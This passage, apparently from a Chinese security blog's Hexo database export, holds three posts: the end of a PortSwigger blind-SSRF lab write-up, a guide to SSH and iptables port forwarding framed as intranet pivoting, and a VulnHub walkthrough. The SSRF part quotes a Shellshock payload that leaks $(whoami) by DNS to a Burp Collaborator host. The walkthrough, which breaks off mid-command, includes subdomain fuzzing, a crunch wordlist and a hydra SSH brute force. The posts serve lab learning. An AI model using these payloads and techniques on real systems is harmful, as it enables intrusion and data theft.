$(whoami).BURP-COLLABORATOR-SUBDOMAIN\n</code></pre>\n<p>7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。</p>\n<p>单击“清除 §”，将 Referer 标头更改为<code>http://192.168.0.1:8080</code>突出显示 IP 地址的最后一个八位字节（数字<code>1</code>），单击“添加 §”。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png\"></p>\n<p>8、切换到 Payloads 选项卡，将有效负载类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/ZTIia8tKdES7FWk.png\"></p>\n<p>9、点击“开始攻击”。</p>\n<p>攻击完成后，返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。<a href=\"https://portswigger.net/web-security/ssrf\">您应该会看到由成功的盲SSRF 攻击</a>命中的后端系统发起的 DNS 交互。操作系统用户的名称应出现在 DNS 子域中。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/krIKytbocuZSFQv.png\"></p>\n<p>要完成实验，请输入操作系统用户的名称。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/VUYweFM2ZaLK9p3.png\"></p>\n<p>另一种利用盲SSRF漏洞的途径是诱使应用程序连接到攻击者控制的系统，并向建立连接的HTTP客户端返回恶意响应。如果您可以利用服务器 HTTP 实现中的严重客户端漏洞，您可能能够在应用程序基础架构中实现远程代码执行。<a href=\"https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient\">点击详细阅读</a>。</p>\n<h2 id=\"为-SSRF-漏洞寻找隐藏的攻击面\"><a href=\"#为-SSRF-漏洞寻找隐藏的攻击面\" class=\"headerlink\" title=\"为 SSRF 漏洞寻找隐藏的攻击面\"></a>为 SSRF 漏洞寻找隐藏的攻击面</h2><p>许多服务器端请求伪造漏洞相对容易被发现，因为应用程序的正常流量涉及包含完整 URL 的请求参数。SSRF 的其他示例更难找到。</p>\n<h3 id=\"请求中的部分-URL\"><a href=\"#请求中的部分-URL\" class=\"headerlink\" title=\"请求中的部分 URL\"></a>请求中的部分 URL</h3><p>有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。然后，提交的值会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，那么潜在的攻击面可能很明显。但是，作为完整 SSRF 的可利用性可能会受到限制，因为您无法控制所请求的整个 URL。</p>\n<h3 id=\"数据格式中的-URL\"><a href=\"#数据格式中的-URL\" class=\"headerlink\" title=\"数据格式中的 URL\"></a>数据格式中的 URL</h3><p>一些应用程序以其规范允许包含可能由数据解析器请求的格式的 URL 的格式传输数据。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到<a href=\"https://portswigger.net/web-security/xxe\">XXE 注入</a>的攻击，进而容易受到 XXE 的 SSRF 攻击。当我们查看<a href=\"https://portswigger.net/web-security/xxe\">XXE 注入</a>漏洞时，我们将更详细地介绍这一点。</p>\n<h3 id=\"通过Referer头的SSRF\"><a href=\"#通过Referer头的SSRF\" class=\"headerlink\" title=\"通过Referer头的SSRF\"></a>通过Referer头的SSRF</h3><p>一些应用程序使用跟踪访问者的服务器端分析软件。该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。通常，分析软件实际上会访问出现在 Referer 标头中的任何第三方 URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常代表 SSRF 漏洞的有效攻击面。有关涉及 Referer 标头的漏洞示例，请参阅<a href=\"https://portswigger.net/web-security/ssrf/blind\">盲 SSRF 漏洞</a>。</p>\n<hr>\n<blockquote>\n<p>参考链接：</p>\n<p><a href=\"https://portswigger.net/web-security/ssrf\">Web Security Academy-SSRF</a></p>\n<p><a href=\"https://www.ddosi.org/ssrf-lab/\">portswigger ssrf lab 服务器端请求伪造靶场</a></p>\n<p><a href=\"https://websec.readthedocs.io/zh/latest/vuln/ssrf.html\">Web安全学习笔记-4.4 SSRF</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/321535.html\">关于SSRF和多种绕过方式</a></p>\n<p><a href=\"https://www.cnblogs.com/kaituorensheng/p/3776527.html\">URL中“#” “？” &amp;“”号的作用</a></p>\n</blockquote>\n"},{"title":"SSH转发和iptables端口转发","date":"2021-12-02T06:54:23.000Z","_content":"\n## SSH端口转发简介\n\nSSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。SSH还能够将其他TCP端口的网络数据通过SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做\"**隧道**\"（tunneling），这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。\n\n**SSH端口转发的两大功能**：\n\n- 加密SSH Client端至SSH Server端之间的通讯数据。\n- 突破防火墙的简直完成一些之前无法建立的TCP连接。\n\n## SSH本地SOCKS5代理\n\n```\nssh -qTfnN -D 7777 username@remotehost\n```\n\n```\n参数说明：\n-C  压缩数据\n-q  安静模式\n-T  禁止远程分配终端\n-n  关闭标准输入\n-N  不执行远程命令\n-f  ssh后台运行\n-D  本地的端口\n```\n\n![](https://i.loli.net/2021/12/02/v4W65cV3yq9xikr.png)\n\n浏览器开启代理：\n\n![](https://i.loli.net/2021/12/02/bUxjd9nwPiaOGeJ.png)\n\nIP地址已经发生变化：\n\n![](https://i.loli.net/2021/12/02/UX8ovdIgrj1ZaTp.png)\n\n## SSH本地转发\n\n**场景：**\n\n1. 本机能与中间服务器互通\n2. 中间服务器能与目标机器互通，中间服务器已拿到目标机器权限\n3. 本地不能直接访问目标机器\n4. 目标机器不出网\n5. 目的：本机能访问目标机器\n\n**命令：**\n\n```\nssh -L localport:targethost:targetport username@sshserver\n```\n\n```\nlocalport       本机开启的端口\ntargethost      目标机器的IP地址\ntargetport  \t目标机器的端口\nusername\t\t中间服务器的用户名\nsshserver       中间服务器的IP地址\n```\n\n**结果：**\n\n此时，在在本机访问localport就可以访问目标主机的targetport了\n\n## SSH远程转发\n\n反向连接的一种，可以穿透内网防火墙，在内网中比较好用\n\n```\nssh -R sshserverport:targethost:targetport username@sshserver\n```\n\n```\nsshserverpor        中间服务器的端口号\ntargethost          目标机器的IP地址\ntargetport      \t目标机器的端口\nusername\t\t\t中间服务器的用户名\nsshserver           中间服务器的IP地址\n```\n\n**开启远程需要更改配置**\n\n```\nsudo vim /etc/ssh/sshd_config\t\n#任何人访问这台机器的某一个端口，都可以访问到目标机的映射出的端口；这个需要在中间服务器上开启\nGatewayPorts    yes\n```\n\n```\nsudo /etc/ssh/sshd_config restart   #重启SSH\n```\n\n**因为是反向连接，所以肯定需要在目标机器上执行命令**\n\n在目标机器上执行命令：\n\n```\nssh -R 8899:10.10.10.132:80 test@10.10.10.135 \n#把目标机的80端口转发到10.10.10.135(中间服务器)上的8899端口\n```\n\n现在任何机器，只要访问10.10.10.13这台中间服务器的8899端口，就相当于访问了不出网的内网10.10.10.132机器的80端口\n\n## iptables端口转发\n\n### 基础配置\n\n1. 修改内核文件实现端口转发\n\n   **方法1：**\n\n```\n1.编辑sysctl配置文件 vim /etc/sysctl.conf\n2.开启ipv4 forward\n```\n\n​\t\t**方法2**： 直接sysctl修改\n\n```\n使用sysctl -w net.ipv4.ip_forward=1\n然后查看sysctl -p和之前修改的一样。\n```\n\n### 本地端口转发\n\nREDIRECT模式是防火墙所在的机子内部转发包或流到另一个端口，也就是所有接收的包只转发给本地端口。\n\n将本机的 7777 端口转发到 6666 端口：\n\n```\niptables -t nat -A PREROUTING -p tcp --dport 7777 -j REDIRECT --to-port 6666\n```\n\n### 远程端口转发\n\n通过 1.168 的 6666 端口访问 1.8 的 7777 端口，在 1.168 上设置：\n\n```\nsysctl -w net.ipv4.ip_forward=1\niptables -t nat -A PREROUTING -p tcp --dport 6666 -j DNAT --to-destination 192.168.1.8:7777\niptables -t nat -A POSTROUTING -p tcp -d 192.168.1.8 --dport 7777 -j SNAT --to-source 192.168.1.168\n```\n\n### 删除该端口转发\n\n查看当前iptables 的 nat 表的所有规则：（不用 -t 指定表名默认的是指 filter 表）\n\n```\niptables -t nat -nL --line\n```\n\n删除指定表的指定链上的规则， -D 并指定序号即可。\n\n```\niptables -t nat -D PREROUTING 1\n```\n\n\n\n> 参考：\n>\n> [SSH代理转发](https://mp.weixin.qq.com/s/tri1ruKqc-YztdWC-JmznA)\n>\n> [SSH端口转发详解及实例](https://www.cnblogs.com/keerya/p/7612715.html)\n>\n> [一文带你了解iptables用法及端口转发](https://www.freebuf.com/articles/web/289254.html)\n>\n> [iptables 端口转发](https://blog.csdn.net/zhouguoqionghai/article/details/81947603)\n","source":"_posts/SSH转发和iptables端口转发.md","raw":"---\ntitle: SSH转发和iptables端口转发\ndate: 2021-12-02 14:54:23\ncategories:\n- 内网渗透\ntags:\n- 端口转发\n---\n\n## SSH端口转发简介\n\nSSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。SSH还能够将其他TCP端口的网络数据通过SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做\"**隧道**\"（tunneling），这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。\n\n**SSH端口转发的两大功能**：\n\n- 加密SSH Client端至SSH Server端之间的通讯数据。\n- 突破防火墙的简直完成一些之前无法建立的TCP连接。\n\n## SSH本地SOCKS5代理\n\n```\nssh -qTfnN -D 7777 username@remotehost\n```\n\n```\n参数说明：\n-C  压缩数据\n-q  安静模式\n-T  禁止远程分配终端\n-n  关闭标准输入\n-N  不执行远程命令\n-f  ssh后台运行\n-D  本地的端口\n```\n\n![](https://i.loli.net/2021/12/02/v4W65cV3yq9xikr.png)\n\n浏览器开启代理：\n\n![](https://i.loli.net/2021/12/02/bUxjd9nwPiaOGeJ.png)\n\nIP地址已经发生变化：\n\n![](https://i.loli.net/2021/12/02/UX8ovdIgrj1ZaTp.png)\n\n## SSH本地转发\n\n**场景：**\n\n1. 本机能与中间服务器互通\n2. 中间服务器能与目标机器互通，中间服务器已拿到目标机器权限\n3. 本地不能直接访问目标机器\n4. 目标机器不出网\n5. 目的：本机能访问目标机器\n\n**命令：**\n\n```\nssh -L localport:targethost:targetport username@sshserver\n```\n\n```\nlocalport       本机开启的端口\ntargethost      目标机器的IP地址\ntargetport  \t目标机器的端口\nusername\t\t中间服务器的用户名\nsshserver       中间服务器的IP地址\n```\n\n**结果：**\n\n此时，在在本机访问localport就可以访问目标主机的targetport了\n\n## SSH远程转发\n\n反向连接的一种，可以穿透内网防火墙，在内网中比较好用\n\n```\nssh -R sshserverport:targethost:targetport username@sshserver\n```\n\n```\nsshserverpor        中间服务器的端口号\ntargethost          目标机器的IP地址\ntargetport      \t目标机器的端口\nusername\t\t\t中间服务器的用户名\nsshserver           中间服务器的IP地址\n```\n\n**开启远程需要更改配置**\n\n```\nsudo vim /etc/ssh/sshd_config\t\n#任何人访问这台机器的某一个端口，都可以访问到目标机的映射出的端口；这个需要在中间服务器上开启\nGatewayPorts    yes\n```\n\n```\nsudo /etc/ssh/sshd_config restart   #重启SSH\n```\n\n**因为是反向连接，所以肯定需要在目标机器上执行命令**\n\n在目标机器上执行命令：\n\n```\nssh -R 8899:10.10.10.132:80 test@10.10.10.135 \n#把目标机的80端口转发到10.10.10.135(中间服务器)上的8899端口\n```\n\n现在任何机器，只要访问10.10.10.13这台中间服务器的8899端口，就相当于访问了不出网的内网10.10.10.132机器的80端口\n\n## iptables端口转发\n\n### 基础配置\n\n1. 修改内核文件实现端口转发\n\n   **方法1：**\n\n```\n1.编辑sysctl配置文件 vim /etc/sysctl.conf\n2.开启ipv4 forward\n```\n\n​\t\t**方法2**： 直接sysctl修改\n\n```\n使用sysctl -w net.ipv4.ip_forward=1\n然后查看sysctl -p和之前修改的一样。\n```\n\n### 本地端口转发\n\nREDIRECT模式是防火墙所在的机子内部转发包或流到另一个端口，也就是所有接收的包只转发给本地端口。\n\n将本机的 7777 端口转发到 6666 端口：\n\n```\niptables -t nat -A PREROUTING -p tcp --dport 7777 -j REDIRECT --to-port 6666\n```\n\n### 远程端口转发\n\n通过 1.168 的 6666 端口访问 1.8 的 7777 端口，在 1.168 上设置：\n\n```\nsysctl -w net.ipv4.ip_forward=1\niptables -t nat -A PREROUTING -p tcp --dport 6666 -j DNAT --to-destination 192.168.1.8:7777\niptables -t nat -A POSTROUTING -p tcp -d 192.168.1.8 --dport 7777 -j SNAT --to-source 192.168.1.168\n```\n\n### 删除该端口转发\n\n查看当前iptables 的 nat 表的所有规则：（不用 -t 指定表名默认的是指 filter 表）\n\n```\niptables -t nat -nL --line\n```\n\n删除指定表的指定链上的规则， -D 并指定序号即可。\n\n```\niptables -t nat -D PREROUTING 1\n```\n\n\n\n> 参考：\n>\n> [SSH代理转发](https://mp.weixin.qq.com/s/tri1ruKqc-YztdWC-JmznA)\n>\n> [SSH端口转发详解及实例](https://www.cnblogs.com/keerya/p/7612715.html)\n>\n> [一文带你了解iptables用法及端口转发](https://www.freebuf.com/articles/web/289254.html)\n>\n> [iptables 端口转发](https://blog.csdn.net/zhouguoqionghai/article/details/81947603)\n","slug":"SSH转发和iptables端口转发","published":1,"updated":"2021-12-25T12:19:50.096Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyg000iwku175kibbuw","content":"<h2 id=\"SSH端口转发简介\"><a href=\"#SSH端口转发简介\" class=\"headerlink\" title=\"SSH端口转发简介\"></a>SSH端口转发简介</h2><p>SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。SSH还能够将其他TCP端口的网络数据通过SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做”<strong>隧道</strong>“（tunneling），这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。</p>\n<p><strong>SSH端口转发的两大功能</strong>：</p>\n<ul>\n<li>加密SSH Client端至SSH Server端之间的通讯数据。</li>\n<li>突破防火墙的简直完成一些之前无法建立的TCP连接。</li>\n</ul>\n<h2 id=\"SSH本地SOCKS5代理\"><a href=\"#SSH本地SOCKS5代理\" class=\"headerlink\" title=\"SSH本地SOCKS5代理\"></a>SSH本地SOCKS5代理</h2><pre><code>ssh -qTfnN -D 7777 username@remotehost\n</code></pre>\n<pre><code>参数说明：\n-C  压缩数据\n-q  安静模式\n-T  禁止远程分配终端\n-n  关闭标准输入\n-N  不执行远程命令\n-f  ssh后台运行\n-D  本地的端口\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/12/02/v4W65cV3yq9xikr.png\"></p>\n<p>浏览器开启代理：</p>\n<p><img src=\"https://i.loli.net/2021/12/02/bUxjd9nwPiaOGeJ.png\"></p>\n<p>IP地址已经发生变化：</p>\n<p><img src=\"https://i.loli.net/2021/12/02/UX8ovdIgrj1ZaTp.png\"></p>\n<h2 id=\"SSH本地转发\"><a href=\"#SSH本地转发\" class=\"headerlink\" title=\"SSH本地转发\"></a>SSH本地转发</h2><p><strong>场景：</strong></p>\n<ol>\n<li>本机能与中间服务器互通</li>\n<li>中间服务器能与目标机器互通，中间服务器已拿到目标机器权限</li>\n<li>本地不能直接访问目标机器</li>\n<li>目标机器不出网</li>\n<li>目的：本机能访问目标机器</li>\n</ol>\n<p><strong>命令：</strong></p>\n<pre><code>ssh -L localport:targethost:targetport username@sshserver\n</code></pre>\n<pre><code>localport       本机开启的端口\ntargethost      目标机器的IP地址\ntargetport      目标机器的端口\nusername        中间服务器的用户名\nsshserver       中间服务器的IP地址\n</code></pre>\n<p><strong>结果：</strong></p>\n<p>此时，在在本机访问localport就可以访问目标主机的targetport了</p>\n<h2 id=\"SSH远程转发\"><a href=\"#SSH远程转发\" class=\"headerlink\" title=\"SSH远程转发\"></a>SSH远程转发</h2><p>反向连接的一种，可以穿透内网防火墙，在内网中比较好用</p>\n<pre><code>ssh -R sshserverport:targethost:targetport username@sshserver\n</code></pre>\n<pre><code>sshserverpor        中间服务器的端口号\ntargethost          目标机器的IP地址\ntargetport          目标机器的端口\nusername            中间服务器的用户名\nsshserver           中间服务器的IP地址\n</code></pre>\n<p><strong>开启远程需要更改配置</strong></p>\n<pre><code>sudo vim /etc/ssh/sshd_config    \n#任何人访问这台机器的某一个端口，都可以访问到目标机的映射出的端口；这个需要在中间服务器上开启\nGatewayPorts    yes\n</code></pre>\n<pre><code>sudo /etc/ssh/sshd_config restart   #重启SSH\n</code></pre>\n<p><strong>因为是反向连接，所以肯定需要在目标机器上执行命令</strong></p>\n<p>在目标机器上执行命令：</p>\n<pre><code>ssh -R 8899:10.10.10.132:80 test@10.10.10.135 \n#把目标机的80端口转发到10.10.10.135(中间服务器)上的8899端口\n</code></pre>\n<p>现在任何机器，只要访问10.10.10.13这台中间服务器的8899端口，就相当于访问了不出网的内网10.10.10.132机器的80端口</p>\n<h2 id=\"iptables端口转发\"><a href=\"#iptables端口转发\" class=\"headerlink\" title=\"iptables端口转发\"></a>iptables端口转发</h2><h3 id=\"基础配置\"><a href=\"#基础配置\" class=\"headerlink\" title=\"基础配置\"></a>基础配置</h3><ol>\n<li><p>修改内核文件实现端口转发</p>\n<p><strong>方法1：</strong></p>\n</li>\n</ol>\n<pre><code>1.编辑sysctl配置文件 vim /etc/sysctl.conf\n2.开启ipv4 forward\n</code></pre>\n<p>​        <strong>方法2</strong>： 直接sysctl修改</p>\n<pre><code>使用sysctl -w net.ipv4.ip_forward=1\n然后查看sysctl -p和之前修改的一样。\n</code></pre>\n<h3 id=\"本地端口转发\"><a href=\"#本地端口转发\" class=\"headerlink\" title=\"本地端口转发\"></a>本地端口转发</h3><p>REDIRECT模式是防火墙所在的机子内部转发包或流到另一个端口，也就是所有接收的包只转发给本地端口。</p>\n<p>将本机的 7777 端口转发到 6666 端口：</p>\n<pre><code>iptables -t nat -A PREROUTING -p tcp --dport 7777 -j REDIRECT --to-port 6666\n</code></pre>\n<h3 id=\"远程端口转发\"><a href=\"#远程端口转发\" class=\"headerlink\" title=\"远程端口转发\"></a>远程端口转发</h3><p>通过 1.168 的 6666 端口访问 1.8 的 7777 端口，在 1.168 上设置：</p>\n<pre><code>sysctl -w net.ipv4.ip_forward=1\niptables -t nat -A PREROUTING -p tcp --dport 6666 -j DNAT --to-destination 192.168.1.8:7777\niptables -t nat -A POSTROUTING -p tcp -d 192.168.1.8 --dport 7777 -j SNAT --to-source 192.168.1.168\n</code></pre>\n<h3 id=\"删除该端口转发\"><a href=\"#删除该端口转发\" class=\"headerlink\" title=\"删除该端口转发\"></a>删除该端口转发</h3><p>查看当前iptables 的 nat 表的所有规则：（不用 -t 指定表名默认的是指 filter 表）</p>\n<pre><code>iptables -t nat -nL --line\n</code></pre>\n<p>删除指定表的指定链上的规则， -D 并指定序号即可。</p>\n<pre><code>iptables -t nat -D PREROUTING 1\n</code></pre>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://mp.weixin.qq.com/s/tri1ruKqc-YztdWC-JmznA\">SSH代理转发</a></p>\n<p><a href=\"https://www.cnblogs.com/keerya/p/7612715.html\">SSH端口转发详解及实例</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/289254.html\">一文带你了解iptables用法及端口转发</a></p>\n<p><a href=\"https://blog.csdn.net/zhouguoqionghai/article/details/81947603\">iptables 端口转发</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"SSH端口转发简介\"><a href=\"#SSH端口转发简介\" class=\"headerlink\" title=\"SSH端口转发简介\"></a>SSH端口转发简介</h2><p>SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。SSH还能够将其他TCP端口的网络数据通过SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做”<strong>隧道</strong>“（tunneling），这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。</p>\n<p><strong>SSH端口转发的两大功能</strong>：</p>\n<ul>\n<li>加密SSH Client端至SSH Server端之间的通讯数据。</li>\n<li>突破防火墙的简直完成一些之前无法建立的TCP连接。</li>\n</ul>\n<h2 id=\"SSH本地SOCKS5代理\"><a href=\"#SSH本地SOCKS5代理\" class=\"headerlink\" title=\"SSH本地SOCKS5代理\"></a>SSH本地SOCKS5代理</h2><pre><code>ssh -qTfnN -D 7777 username@remotehost\n</code></pre>\n<pre><code>参数说明：\n-C  压缩数据\n-q  安静模式\n-T  禁止远程分配终端\n-n  关闭标准输入\n-N  不执行远程命令\n-f  ssh后台运行\n-D  本地的端口\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/12/02/v4W65cV3yq9xikr.png\"></p>\n<p>浏览器开启代理：</p>\n<p><img src=\"https://i.loli.net/2021/12/02/bUxjd9nwPiaOGeJ.png\"></p>\n<p>IP地址已经发生变化：</p>\n<p><img src=\"https://i.loli.net/2021/12/02/UX8ovdIgrj1ZaTp.png\"></p>\n<h2 id=\"SSH本地转发\"><a href=\"#SSH本地转发\" class=\"headerlink\" title=\"SSH本地转发\"></a>SSH本地转发</h2><p><strong>场景：</strong></p>\n<ol>\n<li>本机能与中间服务器互通</li>\n<li>中间服务器能与目标机器互通，中间服务器已拿到目标机器权限</li>\n<li>本地不能直接访问目标机器</li>\n<li>目标机器不出网</li>\n<li>目的：本机能访问目标机器</li>\n</ol>\n<p><strong>命令：</strong></p>\n<pre><code>ssh -L localport:targethost:targetport username@sshserver\n</code></pre>\n<pre><code>localport       本机开启的端口\ntargethost      目标机器的IP地址\ntargetport      目标机器的端口\nusername        中间服务器的用户名\nsshserver       中间服务器的IP地址\n</code></pre>\n<p><strong>结果：</strong></p>\n<p>此时，在在本机访问localport就可以访问目标主机的targetport了</p>\n<h2 id=\"SSH远程转发\"><a href=\"#SSH远程转发\" class=\"headerlink\" title=\"SSH远程转发\"></a>SSH远程转发</h2><p>反向连接的一种，可以穿透内网防火墙，在内网中比较好用</p>\n<pre><code>ssh -R sshserverport:targethost:targetport username@sshserver\n</code></pre>\n<pre><code>sshserverpor        中间服务器的端口号\ntargethost          目标机器的IP地址\ntargetport          目标机器的端口\nusername            中间服务器的用户名\nsshserver           中间服务器的IP地址\n</code></pre>\n<p><strong>开启远程需要更改配置</strong></p>\n<pre><code>sudo vim /etc/ssh/sshd_config    \n#任何人访问这台机器的某一个端口，都可以访问到目标机的映射出的端口；这个需要在中间服务器上开启\nGatewayPorts    yes\n</code></pre>\n<pre><code>sudo /etc/ssh/sshd_config restart   #重启SSH\n</code></pre>\n<p><strong>因为是反向连接，所以肯定需要在目标机器上执行命令</strong></p>\n<p>在目标机器上执行命令：</p>\n<pre><code>ssh -R 8899:10.10.10.132:80 test@10.10.10.135 \n#把目标机的80端口转发到10.10.10.135(中间服务器)上的8899端口\n</code></pre>\n<p>现在任何机器，只要访问10.10.10.13这台中间服务器的8899端口，就相当于访问了不出网的内网10.10.10.132机器的80端口</p>\n<h2 id=\"iptables端口转发\"><a href=\"#iptables端口转发\" class=\"headerlink\" title=\"iptables端口转发\"></a>iptables端口转发</h2><h3 id=\"基础配置\"><a href=\"#基础配置\" class=\"headerlink\" title=\"基础配置\"></a>基础配置</h3><ol>\n<li><p>修改内核文件实现端口转发</p>\n<p><strong>方法1：</strong></p>\n</li>\n</ol>\n<pre><code>1.编辑sysctl配置文件 vim /etc/sysctl.conf\n2.开启ipv4 forward\n</code></pre>\n<p>​        <strong>方法2</strong>： 直接sysctl修改</p>\n<pre><code>使用sysctl -w net.ipv4.ip_forward=1\n然后查看sysctl -p和之前修改的一样。\n</code></pre>\n<h3 id=\"本地端口转发\"><a href=\"#本地端口转发\" class=\"headerlink\" title=\"本地端口转发\"></a>本地端口转发</h3><p>REDIRECT模式是防火墙所在的机子内部转发包或流到另一个端口，也就是所有接收的包只转发给本地端口。</p>\n<p>将本机的 7777 端口转发到 6666 端口：</p>\n<pre><code>iptables -t nat -A PREROUTING -p tcp --dport 7777 -j REDIRECT --to-port 6666\n</code></pre>\n<h3 id=\"远程端口转发\"><a href=\"#远程端口转发\" class=\"headerlink\" title=\"远程端口转发\"></a>远程端口转发</h3><p>通过 1.168 的 6666 端口访问 1.8 的 7777 端口，在 1.168 上设置：</p>\n<pre><code>sysctl -w net.ipv4.ip_forward=1\niptables -t nat -A PREROUTING -p tcp --dport 6666 -j DNAT --to-destination 192.168.1.8:7777\niptables -t nat -A POSTROUTING -p tcp -d 192.168.1.8 --dport 7777 -j SNAT --to-source 192.168.1.168\n</code></pre>\n<h3 id=\"删除该端口转发\"><a href=\"#删除该端口转发\" class=\"headerlink\" title=\"删除该端口转发\"></a>删除该端口转发</h3><p>查看当前iptables 的 nat 表的所有规则：（不用 -t 指定表名默认的是指 filter 表）</p>\n<pre><code>iptables -t nat -nL --line\n</code></pre>\n<p>删除指定表的指定链上的规则， -D 并指定序号即可。</p>\n<pre><code>iptables -t nat -D PREROUTING 1\n</code></pre>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://mp.weixin.qq.com/s/tri1ruKqc-YztdWC-JmznA\">SSH代理转发</a></p>\n<p><a href=\"https://www.cnblogs.com/keerya/p/7612715.html\">SSH端口转发详解及实例</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/289254.html\">一文带你了解iptables用法及端口转发</a></p>\n<p><a href=\"https://blog.csdn.net/zhouguoqionghai/article/details/81947603\">iptables 端口转发</a></p>\n</blockquote>\n"},{"title":"driftingblues VulnHub Walkthrough","date":"2021-10-12T08:24:52.000Z","_content":"\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png)\n\n只开放了22和80端口，只能先访问80端口看一下有没有什么信息\n\n![](https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png)\n\n好像没什么东西，扫了目录也没什么信息\n\n![](https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png)\n\n右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径\n\n![](https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png)\n\n访问一下，这个很明显了，到在线的ook!解密网站解密一下\n\n![](https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png)\n\n是一个提示，应该是要修改host文件\n\n![](https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png)\n\n在主页上可以看到一个域名，尝试添加到host再访问\n\n![](https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png)\n\n![](https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png)\n\n重新扫目录还是没有发现，那就试试爆破子域名\n\n```\nwfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H \"Host:FUZZ.driftingblues.box\" --hw 570\n```\n\n![](https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png)\n\n直接访问解析不了，需要再修改一下host\n\n![](https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png)\n\n访问一下\n\n![](https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png)\n\n再扫一次目录，发现有robots.txt\n\n![](https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png)\n\n访问一下，看到给了一些路径\n\n![](https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png)\n\n查看ssh_cred.txt，给了提示\n\n![](https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png)\n\n### 漏洞利用\n\nssh登录的密码是`1mw4ckyyucky*`，目前还缺一位数字，一共十个可能的密码，先生成一下\n\n```\ncrunch 13 13 -t 1mw4ckyyucky% > pass\n```\n\n看一下我们生成的密码集合\n\n![](https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png)\n\n接下来尝试爆破ssh登录密码，根据前面访问`test.driftingblues.box`的提示，用户名应该是`eric`\n\n```\nhydra -l eric -P pass ssh://192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png)\n\n找到密码了，直接登录ssh\n\n![](https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png)\n\n直接获取第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n### 提权\n\n```\nuname -a\nfind / -perm -u=s -type f 2>/dev/null\ngetcap -r  / 